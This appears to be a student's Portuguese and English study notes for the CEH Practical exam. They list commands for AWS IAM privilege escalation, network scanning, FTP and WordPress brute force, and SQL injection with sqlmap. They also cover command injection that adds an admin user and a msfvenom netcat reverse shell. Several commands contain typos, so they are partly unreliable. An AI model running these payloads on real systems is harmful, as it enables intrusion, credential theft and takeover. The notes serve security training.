* Voltar a aws e ir em IAM, clicar no nome do usuario, ir em add permissions, attach existing policies, clicar em AmazonS3FullAccess, next, add permissions.
* no prompt: aws s3 ls s3://site.com/ --profike nome_user
* Listou agora é so baixar:
* aws s3 --profile nome_user cp s3://site.com/arquivo.htm . (tem esse ponto no final do comando)

Escalacao privilegio

Nesta tarefa, para fins de demonstração, foi criada uma conta de usuário IAM com permissões, incluindo iam:CreatePolicy, iam:AttachUserPolicy, iam:ListUserPolicies, sts:AssumeRole e iam:ListRoles.
Essas políticas podem ser exploradas por atacantes para obter privilégios de nível administrativo.

É necessário configurar a conta AWS:

		aws configure

Em seguida, um arquivo JSON com as políticas é criado:

pluma user-policy.json
{"Version":"2012-10-17",
"Statement":[
   {
   
    "Effect":"Allow",

    "Action":"*",

	"Resource":"*",
  }
]
}

**NOTA:** Esta é uma política de AdministratorAccess que concede acesso de administrador ao usuário IAM de destino.

Agora é necessário anexar essa política à conta do usuário IAM de destino:

		aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json

		aws iam attach-user-policy --user-name [target username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy

Para ver la lista de las politicas adjuntadas a un usuario:

		aws iam list-attached-user-policies --user-name [target username
  
Agora que você já tem acesso de administrador à conta de usuário IAM de destino, você pode listar os usuários IAM no ambiente AWS:

		aws iam list-users (lista de usuarios)
		aws s3apssi list-buckets --query "Buckets.Name" (list of S3Buckets)
		aws iam list-user-policies (user policies)
		aws iam list-role-policies (Role policies)
		aws iam list-group-policies (Group policies)
		aws iam create-user


## FQDN - Fully Qualified Domain Name

FQDN = Hostname + domain (exemp: mail.site.com)

Achando o FQDN com nmap, porta 389 ldap:

		nmap -p389 -sV -iL target_list
		or
		nmap -p389 -sV 145.56.2.56 -Pn
*O FQDN é o host.domain*

# All THINGs

# My ceh practical notes
#  Scanning Networks (always do sudo su) --> To be root
```
1- Nmap scan for alive/active hosts command for nmap -sn 000.00.0.0/24
2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-  namp -f 10.10.10.16
4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
```
# Enumeration
```
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
4- DNS recon/enum-  dnsrecon -d www.google.com -z
5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
```
#  Quick Overview (Stegnography) --> Snow , Openstego
```
1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
3- Image Stegnography using Openstego- PRACTICE ??
```
#  Sniffing
```
1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```
#  Hacking Web Servers
```
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

hydra -l user -P passlist.txt ftp://10.10.10.10
```
#  Hacking Web Application
```
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
```
#  SQL Injections
```
1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version
```
# Android
```
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
```
# Wireshark
```
tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials
Also
```
# Find FQDN
```
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
```
# Cracking Wi-Fi networks
```
Cracking Wifi Password
aircrack-ng [pcap file] (For cracking WEP network)
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

```
#  Some extra work 
```
Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
```
                        

# Portas
<details>
<summary>All Ports</summary>

### Porta 17

	–>QOTD – TCP/UDP – O Serviço de Mensagem do dia (Quote Of The Day) é alvo de Trojans.

### Porta 19

	–> Chargen – TCP/UDP – Chargen é um protocolo de comunicação muito vulnerável, que é usado para amplificar os ataques DdoS, que é um ataque distribuído de negação de serviço.

### Porta 21

	–> FTP – TCP – É utilizado  o FTP que permite que computadores dentro de uma rede promovam trocas de arquivos em massa

 ### Porta 22

	–> SSH – TCP/UDP – É uma porta padrão para acesso remoto (normalmente baseados em sistemas LINUX).
	-> Para acesso as configurações ssh do servidor -> /etc/ssh/sshd_config
	-> Dentro das configurações pode ser alterado o numero da porta, tipos de conexão e etc, é uma boa prática de segurança que o usuário root esteja desabilitado a se autenticar via ssh.
	-> Um scan de portas com nmap normalmente acha o serviço ssh, mas atanção a alteração de numero de portas que é possível dentro das configurações, geralmente tambem é usada a porta 2222.
	 -> Dentro do diretorio root existe uma pasta oculta .ssh, onde ficam alguns arquivos, dentre eles o authorized_keys onde ficam as chaves autorizadas para conexão direta e o arquivo know_hosts onde ficam os fingerprints dos hosts que já tentaram conexão com esse servidor

### Porta 23

	–> Telnet – TCP/UDP – Telnet é um protocolo de comunicação que permite a execução remota de códigos maliciosos.

### Porta 67 | 68

	–> DHCP Server e Client – Pelo serviço DHCP é possível fazer uma configuração automática e dinâmica de computadores que estejam ligados a uma rede TCP/IP.

### Porta 111

	–> Portmap – TCP/UDP – O serviço portmap é um daemon (programa executado em background) para serviços RPC, como o NIS e o NFS, que pode autorizar a execução de códigos maliciosos.

### Porta 123

	–> NTP – UDP – O NTP é um protocolo para sincronizar relógios de computadores e equipamentos de rede, e pode ser vulnerável a servidores de NTP não confiáveis.

### Portas 135 | 136 | 137 | 138 | 139 

	–> Microsoft NetBios – TCP UDP – Estas portas são utilizadas no SO Windows para compartilhamento de arquivos e impressoras.

### Portas 161 | 162

	–> SNMP – TCP/UDP – As portas acima estão associadas com o protocolo de monitoramento SNMP, que devido a diversas vulnerabilidades, devem ser bloqueados na entrada, mas permitida a sua saída.

### Porta 1433

	–> ms-sql – TCP/UDP – Porta padrão de acesso ao SQL Server.

### Porta 1900 

	–> SSDP – UDP – O SSDP é um protocolo de descoberta de serviço com diversas vulnerabilidades. devem ser bloqueados na entrada, mas permitida a sua saída.

### Porta 3306 

	–> MYSQL – TCP/UDP – Porta padrão de acesso ao Mysql Server

### Porta 3389

	–> RDP – TCP/UDP – O RDP é um protocolo multi-canal que permite a conexão entre computadores remotamente, e que pode ser usado de maneira maliciosa. Quando aberta e se voce tem uma credencial pode usar o RDESKTOP do kali para acessar a maquina remotamente

### Porta 5353

	–> mDNS – UDP – O mDNS é um protocolo multi-canal que resolve a resolução de nomes de computadores em pequenas redes e possui enormes vulnerabilidades.

### Porta 5900

	–> VCN – TCP/UDP – O serviço VNC (Virtual Network Computing) pode permitir acesso indesejado ao computador que têm esse serviço habilitado,  podendo ser usado para ataques ou roubo de informações,

### Porta 8012

	–> Telnet – podemos nos conectar via telnet nessa porta e tentar uma invasao
	Ao achar essa porta aberta podemos criar um payload e jogar dentro da maquina para conseguir uma shell
		msfvenom -p cmd/unix/reverse_netcat LHOST=myip LPORT=444
	copio o payload todo mkfifo /tmp/..../tmp/msnht..
	abro um nc -lnvp 444
	vou ate o telnet aberto na porta 8012 e dou um run
		RUN mkfifo /tmp/..../tmp/msnht..
	ele abrira uma shell
 
### Porta 10000

	–> TCP – Porta padrão de acesso ao Miniserv / Webmin httpd. 
</details>


# Links
<details>
<summary>Links para consulta</summary>

 Attacks Vector
https://www.upguard.com/blog/attack-vector

https://searchsecurity.techtarget.com/definition/attack-vector

https://www.balbix.com/insights/attack-vectors-and-breach-methods/

https://attack.mitre.org/

https://searchsecurity.techtarget.com/definition/attack-vector#:~:text=An%20attack%20vector%20is%20a,vulnerabilities%2C%20including%20the%20human%20element.

https://www.youtube.com/watch?v=LsuoJb7n3co

https://www.youtube.com/watch?v=rcB4EZLfi7I

https://www.youtube.com/watch?v=dz7Ntp7KQGA

Network Scanning
https://nmap.org/man/pt_BR/index.html

https://nmap.org/docs.html

https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/

https://hackertarget.com/nmap-tutorial/

https://www.stationx.net/nmap-cheat-sheet/

https://media.x-ra.de/doc/NmapCheatSheetv1.1.pdf

https://www.100security.com.br/netdiscover

https://kalilinuxtutorials.com/netdiscover-scan-live-hosts-network/

https://www.youtube.com/watch?v=PS677owUk-c

https://www.stationx.net/nmap-cheat-sheet/

https://redteamtutorials.com/2018/10/14/nmap-cheatsheet/

https://resources.infosecinstitute.com/nmap-cheat-sheet/#gref

https://medium.com/@infosecsanyam/nmap-cheat-sheet-nmap-scanning-types-scanning-commands-nse-scripts-868a7bd7f692

https://resources.infosecinstitute.com/network-discovery-tool/#gref

Enumeration
https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/

https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/

https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b

https://www.redsiege.com/blog/2020/04/user-enumeration-part-3-windows/

https://nmap.org/nsedoc/scripts/smb-enum-users.html

https://github.com/sensepost/UserEnum

Brute Force
https://linuxconfig.org/password-cracking-with-john-the-ripper-on-linux

https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/

https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/

https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/

https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-passwords-with-tamper-data-thc-hydra-0155374/

https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/

https://medium.com/@sc015020/how-to-crack-passwords-with-john-the-ripper-fdb98449ff1

https://www.varonis.com/blog/john-the-ripper/

Wordlists
http://www.phenoelit.org/dpl/dpl.html

https://datarecovery.com/rd/default-passwords/

https://github.com/Dormidera/WordList-Compendium

https://github.com/danielmiessler/SecLists

https://www.kaggle.com/wjburns/common-password-list-rockyoutxt

SQL Injection
https://hackertarget.com/sqlmap-tutorial/

https://www.binarytides.com/sqlmap-hacking-tutorial/

https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/

https://medium.com/@rafaelrenovaci/dvwa-solution-sql-injection-blind-sqlmap-cd1461ad336e

https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7

https://www.exploit-db.com/docs/english/13701-easy-methodblind-sql-injection.pdf

https://gracefulsecurity.com/sql-injection-filter-evasion-with-sqlmap/

https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3

https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF

https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/

Steganography
https://resources.infosecinstitute.com/steganography-and-tools-to-perform-steganography/#gref

https://flylib.com/books/en/1.36.1/steganography.html

https://blog.eccouncil.org/what-is-steganography-and-what-are-its-popular-techniques/

https://www.edureka.co/blog/steganography-tutorial

https://www.tutorialspoint.com/image-based-steganography-using-python

https://medium.com/@KamranSaifullah/da-vinci-stenography-challenge-solution-90122a59822

https://medium.com/@chrisdare/steganography-in-computer-forensics-6d6e87d85c0a

https://www.telegraph.co.uk/culture/art/art-news/8197896/Mona-Lisa-painting-contains-hidden-code.html

https://medium.com/write-ups-hackthebox/tagged/steganography

http://moinkhans.blogspot.com/2015/06/steghide-beginners-tutorial.html

https://www.2daygeek.com/easy-way-hide-information-inside-image-and-sound-objects/

System Hacking
https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/

https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/

https://blog.rapid7.com/2017/03/21/combining-responder-and-psexec-for-internal-penetration-tests/

https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/

https://medium.com/@hninja049/how-to-easy-find-exploits-with-searchsploit-on-linux-4ce0b82c82fd

https://www.offensive-security.com/offsec/edb-searchsploit-update-2020/

https://www.youtube.com/watch?v=29GlfaH5qCM

https://www.hackingloops.com/maintaining-access-metasploit/

https://resources.infosecinstitute.com/information-gathering-using-metasploit/

https://www.youtube.com/watch?v=s6rwS7UuMt8

https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/

https://www.youtube.com/watch?v=joT8NxlXxVY

https://attack.mitre.org/techniques/T1557/001/

https://www.youtube.com/watch?v=0TBCzaBklcE

https://www.youtube.com/watch?v=FfoQFKhWUr0

https://www.youtube.com/watch?v=Fg2gvk0qgjM

https://www.youtube.com/watch?v=rjRDsXp_MNk

https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning

https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef

https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/

Web Scanners
https://blog.clusterweb.com.br/?p=1297

https://hackertarget.com/nikto-tutorial/

https://geekflare.com/nikto-webserver-scanner/

https://www.youtube.com/watch?v=K78YOmbuT48

https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html

https://www.hackingtutorials.org/web-application-hacking/hack-a-wordpress-website-with-wpscan/

https://linuxhint.com/wpscan_wordpress_vulnerabilities_scan/

https://www.youtube.com/watch?v=SS991k5Alp0

https://www.youtube.com/watch?v=MtyhOrBfG-E

https://www.youtube.com/watch?v=sQ4TtFdaiRA

https://www.exploit-db.com/docs/english/45556-wordpress-penetration-testing-using-wpscan-and-metasploit.pdf?rss

https://www.wpwhitesecurity.com/strong-wordpress-passwords-wpscan/

https://www.youtube.com/watch?v=BTGP5sZfJKY

https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-5-creating-custom-wordlist-with-cewl-0158855/

https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86

https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/

Sniffers
https://www.youtube.com/watch?v=TkCSr30UojM

https://www.varonis.com/blog/how-to-use-wireshark/

https://hackertarget.com/wireshark-tutorial-and-cheat-sheet/

https://www.lifewire.com/wireshark-tutorial-4143298

https://www.comparitech.com/net-admin/wireshark-cheat-sheet/

https://medium.com/hacker-toolbelt/wireshark-filters-cheat-sheet-eacdc438969c

https://github.com/security-cheatsheet/wireshark-cheatsheet

https://www.cellstream.com/resources/2013-09-10-11-55-21/cellstream-public-documents/wireshark-related/83-wireshark-display-filter-cheat-sheet/file

https://www.howtogeek.com/104278/how-to-use-wireshark-to-capture-filter-and-inspect-packets/

https://www.youtube.com/watch?v=4_7A8Ikp5Cc

https://www.guru99.com/wireshark-passwords-sniffer.html

https://danielmiessler.com/study/tcpdump/

https://hackertarget.com/tcpdump-examples/

https://opensource.com/article/18/10/introduction-tcpdump

Reviews and Details CEH Practical
https://www.linkedin.com/pulse/my-jouney-ceh-practical-joas-antonio-dos-santos (My Review)

https://forums.itpro.tv/topic/2604/ceh-practical/2

https://www.linkedin.com/pulse/considera%C3%A7%C3%B5es-sobre-o-exame-ceh-practical-leandro-cortiz/

https://infayer.com/archivos/65

https://medium.com/@jonaldallan/passed-ec-councils-certified-ethical-hacker-practical-20634b6f0f2

https://www.reddit.com/r/CEH/comments/c69fou/passed_ceh_practicalpost_exam_writeup/

https://www.reddit.com/r/CEH/comments/eeu3cx/ceh_practical_handson_exam_passed_with_2020_score/

https://www.reddit.com/r/CEH/comments/8wk2ve/ceh_vs_ceh_practical/

https://www.reddit.com/r/CEH/comments/dfa1y8/passed_ceh_practical/

https://www.reddit.com/r/CEH/comments/b1wgbs/ceh_v10_practical/

https://www.youtube.com/watch?v=ZYEo2AQdgcg

https://www.youtube.com/watch?v=MEYjyr65bJE

https://www.reddit.com/r/CEH/comments/ek0gzp/ceh_practical_passed_2020/

https://www.reddit.com/r/CEH/comments/evuztj/ceh_practical/

https://www.reddit.com/r/CEH/comments/f6t80r/can_ceh_practical_be_regarded_as_a/

https://www.reddit.com/r/CEH/comments/g6z6vn/just_passed_ceh_practical_1920/

https://medium.com/@jonathanchelmus/c-eh-practical-exam-review-42755546c82e

https://www.reddit.com/r/CEH/comments/hk6880/passing_ceh_practical/

https://www.reddit.com/r/CEH/comments/f629zk/ceh_practical_vs_ejpt_vs_ecppt/

https://www.youtube.com/watch?v=o1u69KvSFmQ&list=PLmQBbrHGk7jQbsvF3_xJp720yaUgeYCkj

https://www.youtube.com/watch?v=oYgtePf0z44

https://www.youtube.com/watch?v=9g5gdhoDotg&list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO

https://www.youtube.com/watch?v=LHU0OFcWSBk

https://medium.com/@mruur/ceh-practical-exam-review-918e76f831ff

https://www.youtube.com/c/XanderBilla/videos

https://www.youtube.com/watch?v=YZf5xmeaU58

https://newhorizons.com.sg/ceh-master/

https://www.iitlearning.com/certified-ethical-hacker-practical.php

https://medium.com/@anontuttuvenus/ceh-practical-exam-review-185ea4cef82a

https://www.cyberprotex.com/ceh.html

https://www.infosec4tc.com/product/ceh-master-exam1-exam2-practical/

https://sysaptechnologies.com/certified-ethical-hacker-ceh-v10-practical/

https://jensoroger.wordpress.com/2019/02/09/oscp-ceh-practical/

https://khroot.com/2020/06/20/certified-ethical-hacker-practical-review/

https://github.com/Samsar4/Ethical-Hacking-Labs

https://www.reddit.com/r/CEH/comments/jg0y6u/ceh_practical/

https://www.reddit.com/r/CEH/comments/dfa1y8/passed_ceh_practical/

https://www.reddit.com/r/CEH/comments/cgualo/ceh_practical_tell_me_about_it/

https://www.reddit.com/r/CEH/comments/c69fou/passed_ceh_practicalpost_exam_writeup/
